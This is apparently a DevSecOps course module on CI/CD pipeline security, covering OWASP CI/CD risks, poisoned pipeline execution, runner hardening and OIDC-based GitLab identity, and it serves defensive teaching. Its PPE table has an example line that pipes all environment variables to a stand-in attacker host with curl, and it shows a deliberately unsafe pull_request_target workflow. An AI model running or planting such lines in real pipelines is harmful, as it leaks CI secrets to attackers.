## What this module covers

The module covers two objectives from domain 1:

- **1.3** CI/CD platform risks (**OWASP Top 10 CI/CD Security Risks**), **poisoned pipeline execution** and runner isolation.
- **1.4** Pipeline identity: **OIDC / ID tokens** to the cloud and Vault, protected branches and variables, least privilege for jobs.

Where this sits in the pipeline: underneath all the other controls. Semgrep, Trivy and cosign protect the application; this module protects **the pipeline itself**. If an attacker can modify `.gitlab-ci.yml` or steal a deploy job's token, all the scanners are pointless: they simply delete them or bypass them.

The threat we prevent: the CI/CD system as an entry point into production. A runner has the source code, secrets, access to the registry and the cloud account. The attacks on Codecov (2021, a modified uploader script that sent out environment variables), on SolarWinds (2020, a compromised build) and on popular GitHub Actions (2025, modified action tags that printed secrets to logs) show that this is a real vector, not theory.

## OWASP Top 10 CI/CD Security Risks

OWASP lists ten risks specific to CI/CD systems. Remember them by meaning, not by number:

| ID | Name | What it means in GitLab (example) | Main defense |
|---|---|---|---|
| CICD-SEC-1 | Insufficient Flow Control Mechanisms | One person can push directly to `main` and deploy immediately, without review | Protected branches, required approvals, protected environments |
| CICD-SEC-2 | Inadequate Identity and Access Management | A former employee still has the Maintainer role, too many Owners, shared accounts | SSO, regular membership review, least privilege |
| CICD-SEC-3 | Dependency Chain Abuse | Dependency confusion, typosquatting, a taken-over package in `requirements.txt` | Lock files, private mirror, SCA, pinning |
| CICD-SEC-4 | Poisoned Pipeline Execution (PPE) | An MR changes `.gitlab-ci.yml` or a script the job calls and executes code with secrets | Protected variables, review of CI files, separate CI configuration |
| CICD-SEC-5 | Insufficient PBAC (Pipeline-Based Access Controls) | Every job has the same secrets and the same runner, a test job can deploy to production | Per-environment variables, separate runners, short-lived per-job tokens |
| CICD-SEC-6 | Insufficient Credential Hygiene | A static AWS key in a CI variable for years, a secret printed in a log | OIDC instead of static keys, rotation, masked variables, secret detection |
| CICD-SEC-7 | Insecure System Configuration | Outdated self-managed GitLab, a runner in privileged mode, an exposed registration token | Updates, runner hardening, settings review |
| CICD-SEC-8 | Ungoverned Usage of 3rd Party Services | An integration or app with a broad API token that nobody tracks | Integration inventory, minimal scope, review |
| CICD-SEC-9 | Improper Artifact Integrity Validation | Deploy pulls an image by tag without checking who built it | Signatures, provenance, digest (module 10) |
| CICD-SEC-10 | Insufficient Logging and Visibility | Nobody looks at the audit log; nobody knows who changed a variable | Audit events to the SIEM, alerts on settings changes |

> **In practice:** CICD-SEC-6 is the most common finding in reviews. Go through Settings → CI/CD → Variables in all projects and groups and make a list: how many static cloud keys exist, who created them and when. That list is your plan for migrating to OIDC.

## Poisoned Pipeline Execution

**Poisoned Pipeline Execution (PPE)** means that an attacker, without the right to change the pipeline directly on a protected branch, injects code that the pipeline will execute. Three variants (terminology from OWASP and the original research):

| Variant | How | Example in kurs-shop |
|---|---|---|
| **Direct PPE (D-PPE)** | The attacker changes the CI file itself in their branch or MR | In a feature branch, adds a job to `.gitlab-ci.yml`: `- env \| curl -d @- https://napadac.example` |
| **Indirect PPE (I-PPE)** | The CI file is protected, but the job calls files from the repo: `Makefile`, `scripts/*.sh`, `setup.py`, `conftest.py`, `package.json` scripts | Modifies `tests/conftest.py`; the `test` job executes it with `pytest` |
| **Public PPE (3PE)** | Same, but the attacker is external: an MR from a fork into a public project | A fork opens an MR, a maintainer runs the pipeline in the parent project |

What they have in common: **the pipeline trusts the contents of a branch that no human has reviewed**. The defense is therefore based on unreviewed code not getting secrets.

### Defense in GitLab

1. **Protected variables.** A variable marked *Protected* is available only to pipelines on protected branches and tags. The feature branch from a D-PPE attack doesn't see it.
2. **Protected branches.** Nobody pushes directly to `main`; merges happen only through an MR with approval. Force push is disabled.
3. **CODEOWNERS for CI files.** Changes to `.gitlab-ci.yml`, `ci/` and scripts the pipeline calls require approval from the platform/security team:

```text
# .gitlab/CODEOWNERS
[CI konfiguracija]
/.gitlab-ci.yml        @shop/platform
/ci/                   @shop/platform
/scripts/              @shop/platform
```

(For CODEOWNERS to block a merge, "Require approval from code owners" must be enabled on the protected branch.)

4. **CI configuration outside the repo.** In Settings → CI/CD → General pipelines → *CI/CD configuration file* you can set a path in another project, e.g. `kurs-shop.yml@shop/ci-config`. A developer then can't change the pipeline definition from their branch. For mandatory security jobs across all projects, GitLab Ultimate has **pipeline execution policies**.
5. **Fork MRs.** A pipeline for an MR from a fork runs in the fork by default, without the parent project's variables. When a maintainer runs the pipeline in the parent project, that code gets access to the parent's variables (including protected and masked ones, if the pipeline can see them). Read the diff first, especially CI files and scripts.
6. **Pinned `include`.** Shared templates are included at a fixed version, not from a `main` branch that someone else changes:

```yaml
include:
  - project: shop/ci-templates
    ref: v1.4.0                       # tag (or commit SHA), not main
    file: /templates/security.yml
  - component: gitlab.kurs-shop.ba/shop/components/secret-scan@1.2.0
```

7. **Restrict pipeline variables.** The *Minimum role to use pipeline variables* setting determines who may, on a manual run or via the API, set variables that override those from the configuration. On GitLab.com, new projects in new namespaces have `no_one_allowed`; on a self-managed instance, check and set it manually.

### GitHub Actions equivalents

```yaml
# Dangerous: pull_request_target runs with the base repo's secrets and write token,
# and here it checks out and executes code from the fork. Classic 3PE.
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make test
```

Defense: for code from a fork use `pull_request` (no secrets, read-only token), set `permissions:` to the minimum and pin actions to the full commit SHA (an action's tag can be redirected, as in the 2025 attack on `tj-actions/changed-files`).

```yaml
permissions:
  contents: read
steps:
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

> **In practice:** PPE most often doesn't happen through `.gitlab-ci.yml` (people look at that), but through a `Makefile`, `package.json` scripts, `conftest.py` or `setup.py`. When you threat-model the pipeline, write down for each job which files from the repo it executes. If the job has secrets, those files are just as sensitive as the CI configuration.

## Runner isolation

A **runner** executes code from the repo. If it is compromised, the attacker has everything the runner sees: the current job's secrets, the cache, artifacts and, if the runner is shared and persistent, potentially data from other jobs.

### Principles

- **Short-lived (ephemeral) executors.** Every job in a new container, pod or VM that is destroyed after the job. Kubernetes executor or autoscaling runners. A persistent shell runner on a single server is the worst option: one job can leave a backdoor for the next.
- **No privileged mode and no Docker socket.** `privileged = true` or a mounted `/var/run/docker.sock` effectively give the job root on the host. To build images, use BuildKit in rootless mode, Kaniko or Buildah (in the lab we build images without a daemon using `crane`).
- **Separate runners by trust level.** Production deploys go to a dedicated runner that is *protected* (runs only jobs from protected branches and tags) and has a narrower tag. An MR from a feature branch never reaches that runner.
- **Network.** A test runner doesn't need access to the production database or the cloud metadata service. Network policies or security groups restrict egress.
- **Registration.** Use the new runner authentication tokens (created in the UI) instead of the old registration tokens, and don't share them.

### Example config.toml (Docker executor)

```toml
[[runners]]
  name = "kurs-shop-test"
  executor = "docker"
  [runners.docker]
    image = "python:3.13-slim"
    privileged = false
    allowed_images = ["127.0.0.1:5000/*"]
    allowed_pull_policies = ["always"]
    volumes = ["/cache"]          # no /var/run/docker.sock
    disable_cache = false
```

### Routing jobs to runners

```yaml
deploy-prod:
  stage: deploy
  tags: [prod-deploy]               # only the protected runner with this tag
  environment:
    name: production
  rules:
    - if: $CI_COMMIT_TAG =~ /^v\d+\.\d+\.\d+$/
  script:
    - ./scripts/deploy.sh
```

A tag by itself is not a security boundary (anyone can write `tags: [prod-deploy]` in their branch). The boundary is that the runner is marked as **protected**: a job from an unprotected branch won't even start on it.

> **In practice:** shared runners on GitLab.com are ephemeral VMs and for most jobs are safer than a home-grown shell runner. Introduce self-managed runners where you need access to the internal network, and treat them as production servers: hardening, updates, logging and separation by trust level.

## Pipeline identity

The old model: a CI variable holds `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` with broad permissions, the same for all jobs, with no expiry. When it leaks (printed in a log, PPE, an attack on the runner), it stays valid until someone revokes it manually.

The new model: **the job proves who it is** with a short-lived, signed **OIDC ID token** (JWT), and the cloud or Vault issues short-lived, least-privilege credentials based on the claims in the token.

### ID tokens in GitLab

An ID token is defined per job, with an **audience** (`aud`) that says who the token is intended for:

```yaml
deploy-staging:
  id_tokens:
    AWS_ID_TOKEN:
      aud: https://gitlab.kurs-shop.ba
    VAULT_ID_TOKEN:
      aud: https://vault.kurs-shop.ba
  script:
    - echo "the token is in the \$AWS_ID_TOKEN variable, don't print it"
```

Important:

- The old predefined variables `CI_JOB_JWT` and `CI_JOB_JWT_V2` were **removed in GitLab 17.0**. If an old pipeline uses them, authentication fails. The replacement is `id_tokens`.
- The token is signed (RS256), the issuer (`iss`) is the GitLab instance URL, and it expires with the job timeout.
- Each token has its own `aud`. A token for Vault should not be accepted by AWS and vice versa: that's why you create different tokens with different audience values.

Claims you will check most often:

| Claim | Example | Used for |
|---|---|---|
| `sub` | `project_path:shop/kurs-shop:ref_type:branch:ref:main` | Main identity: project + branch/tag |
| `project_path` | `shop/kurs-shop` | This project only |
| `namespace_path` | `shop` | The whole group |
| `ref`, `ref_type` | `main`, `branch` | Only a specific branch or tags |
| `ref_protected` | `"true"` | Only protected branches/tags (protects against D-PPE from a feature branch) |
| `environment`, `environment_protected` | `production`, `"true"` | Only jobs that deploy to a protected environment |
| `pipeline_source` | `push`, `merge_request_event` | E.g. reject MR pipelines |
| `user_login`, `user_email` | `andrija` | Audit: who started the pipeline |

### GitLab → AWS without static keys

In AWS you create an IAM OIDC provider for `https://gitlab.kurs-shop.ba` and a role with a trust policy that checks `aud` and `sub`:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/gitlab.kurs-shop.ba" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "gitlab.kurs-shop.ba:aud": "https://gitlab.kurs-shop.ba",
        "gitlab.kurs-shop.ba:sub": "project_path:shop/kurs-shop:ref_type:branch:ref:main"
      }
    }
  }]
}
```

The job exchanges the ID token for temporary credentials:

```yaml
deploy-infra:
  stage: deploy
  id_tokens:
    AWS_ID_TOKEN:
      aud: https://gitlab.kurs-shop.ba
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
  script:
    - >
      CREDS=$(aws sts assume-role-with-web-identity
      --role-arn arn:aws:iam::111122223333:role/kurs-shop-deploy
      --role-session-name "gitlab-$CI_PIPELINE_ID-$CI_JOB_ID"
      --web-identity-token "$AWS_ID_TOKEN"
      --duration-seconds 900
      --query Credentials --output json)
    - export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .AccessKeyId)
    - export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .SecretAccessKey)
    - export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .SessionToken)
    - terraform -chdir=infra apply -auto-approve
```

Common mistakes in the trust policy:

- `StringLike` with `project_path:shop/*`, or checking only `aud`: any project in the group (or on the instance) can assume the role.
- Checking only `project_path` without the branch: a job from a feature branch (D-PPE) also gets production credentials.
- The same role for plan and apply: the MR pipeline needs a read-only role for `terraform plan`, and only `main` gets the role with write permissions.

### GitLab → Vault

The same principle applies to Vault. The JWT auth method verifies the token signature using the GitLab instance's JWKS, and the role binds claims (details in module 04):

```bash
vault auth enable jwt
vault write auth/jwt/config \
    oidc_discovery_url="https://gitlab.kurs-shop.ba" \
    bound_issuer="https://gitlab.kurs-shop.ba"

vault write auth/jwt/role/kurs-shop-prod - <<'EOF'
{
  "role_type": "jwt",
  "bound_audiences": ["https://vault.kurs-shop.ba"],
  "user_claim": "user_login",
  "bound_claims": {
    "project_path": "shop/kurs-shop",
    "ref_protected": "true",
    "ref_type": "branch"
  },
  "token_policies": ["kurs-shop-prod-read"],
  "token_ttl": "10m",
  "token_max_ttl": "15m"
}
EOF
```

In the pipeline, with **`secrets:vault`** the runner itself performs the login and fetches the secret:

```yaml
deploy-prod:
  id_tokens:
    VAULT_ID_TOKEN:
      aud: https://vault.kurs-shop.ba
  variables:
    VAULT_SERVER_URL: https://vault.kurs-shop.ba
    VAULT_AUTH_ROLE: kurs-shop-prod
  secrets:
    DB_PASSWORD:
      vault: kurs-shop/prod/db/password@secret   # path/field@mount
      token: $VAULT_ID_TOKEN
      file: false
  script:
    - ./scripts/deploy.sh
```

(`secrets:vault` is a GitLab Premium/Ultimate feature. In the Free tier you do the same manually: `vault write auth/jwt/login role=... jwt=$VAULT_ID_TOKEN`.)

### Static tokens vs OIDC

| | Static key in a CI variable | OIDC ID token + short-lived credentials |
|---|---|---|
| Lifetime | Until someone revokes it | Minutes (role/session TTL) |
| Bound to | Nothing; works from any machine | Project, branch, environment (claims) |
| Rotation | Manual, often forgotten | Not needed |
| Damage if leaked | Large, long-lasting | Small, brief, only from the defined context |
| Audit | Hard: who used the key? | Session name and claims in CloudTrail / Vault audit log |

> **In practice:** migrating away from static keys happens service by service. First create the OIDC role and a job that uses it in parallel with the old key, verify in CloudTrail that the old key is no longer used (`LastUsedDate` in IAM), and only then delete the key and the variable.

## Protected branches, variables and environments

Identity alone doesn't help if an attacker can run a job that has a "good" identity. That's why you combine:

| Mechanism | What it does | Protects against |
|---|---|---|
| **Protected branch/tag** | Restricts who may push, merge, force push; `v*` tags for Maintainers only | Direct changes to `main`, a fake release tag |
| **Protected variable** | Available only to pipelines on protected branches/tags | D-PPE from a feature branch |
| **Masked variable** | The value is replaced with `[MASKED]` in the job log (min. 8 characters, single line) | Accidental printing in a log |
| **Masked and hidden** | Like masked, plus the value can no longer be viewed in the UI after creation | Other Maintainers reading the value |
| **Environment-scoped variable** | Variable only for jobs with `environment: production` | A test job with a production secret (CICD-SEC-5) |
| **Protected environment** | Only specific users/groups may deploy; optionally required approvals | Deploying to production without approval (CICD-SEC-1) |

Masking is **not** protection against malicious code. A job that has a variable can print it base64-encoded, reversed, or send it over the network. Masking protects against accidental printing; protected prevents unreviewed code from getting the variable at all. That's why secrets needed only by deploy should be kept as protected + environment-scoped, or even better in Vault behind a `ref_protected` claim.

### CI_JOB_TOKEN

Every job gets `CI_JOB_TOKEN`, a short-lived token for the GitLab API (cloning, registry, packages). Restrict it:

- in Settings → CI/CD → *Job token permissions* keep the allowlist of projects/groups that may access your project with this token enabled;
- don't use a user's personal access token in a CI variable where a job token or a narrowly scoped deploy token does the same job.

### Least privilege per job

```yaml
variables:
  GIT_DEPTH: "50"            # enough for diff scans, not the whole history

sast:
  stage: test
  # no id_tokens, no secrets: SAST needs no identity at all
  script:
    - semgrep scan --config /opt/kurs/semgrep-rules/ --metrics=off --error .

plan:
  stage: plan
  id_tokens:
    AWS_ID_TOKEN: { aud: https://gitlab.kurs-shop.ba }
  # role kurs-shop-plan: read only (sub also allows MR branches)
  script: [ "./ci/aws-login.sh kurs-shop-plan && terraform -chdir=infra plan" ]

apply:
  stage: deploy
  environment: { name: production }
  id_tokens:
    AWS_ID_TOKEN: { aud: https://gitlab.kurs-shop.ba }
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
  # role kurs-shop-apply: the trust policy requires ref main and a protected environment
  script: [ "./ci/aws-login.sh kurs-shop-apply && terraform -chdir=infra apply -auto-approve" ]
```

> **In practice:** make a table "job → which identity → which permissions". Scanners (gitleaks, Semgrep, Trivy fs, Checkov) need no secrets and should run on the least trusted runners. Secrets and strong identities go only to jobs that actually use them, on protected branches.

## Visibility and audit

CICD-SEC-10 is solved by logs that someone actually looks at:

- Send GitLab **audit events** (changes to variables, protected settings, membership, runners) to the SIEM via audit event streaming (Ultimate) or periodically via the API.
- CloudTrail `AssumeRoleWithWebIdentity` events show which project and branch assumed the role (the session name contains the pipeline and job IDs).
- A Vault **audit device** records every login and every secret read.
- Alerts for risky events: branch protection disabled, a new instance-level variable, a new runner, a force push to `main`.

## Locally in the lab

You can try this in the lab without a GitLab server, against the YAML:

```bash
cd /root/kurs-shop
# which jobs use id_tokens and with which audiences?
yq '.[] | select(has("id_tokens")) | .id_tokens' .gitlab-ci.yml

# is there an outdated CI_JOB_JWT anywhere?
grep -rn 'CI_JOB_JWT' .gitlab-ci.yml ci/ 2>/dev/null

# include without a fixed ref?
yq '.include[] | select(has("project") and (has("ref") | not))' .gitlab-ci.yml

# run the pipeline locally; variables that would be protected are in a file here
gitlab-ci-local --list
```

## Summary

- The **OWASP Top 10 CI/CD** (CICD-SEC-1 … 10) describes platform risks: from weak flow control and IAM, through **PPE** and poor credential hygiene, to missing artifact integrity and logging.
- **PPE** (direct, indirect, public): the pipeline executes code that nobody reviewed. Defense: protected variables, CODEOWNERS for CI files and scripts, CI configuration outside the repo, caution with fork MRs, pinned `include`.
- Runners: ephemeral, no privileged mode and no Docker socket, separated by trust level; production deploy only on a **protected** runner.
- `CI_JOB_JWT` has been removed (GitLab 17.0); use **`id_tokens`** with a separate `aud` for each target.
- Cloud and Vault roles are bound to claims (`sub`, `project_path`, `ref`, `ref_protected`, `environment`), never only to `aud` or a broad wildcard.
- Masked protects against accidental printing, **protected** against unreviewed code getting a secret; environment scope and protected environments separate production.
- Each job gets only the identity and permissions it needs; scanners need no secrets at all.
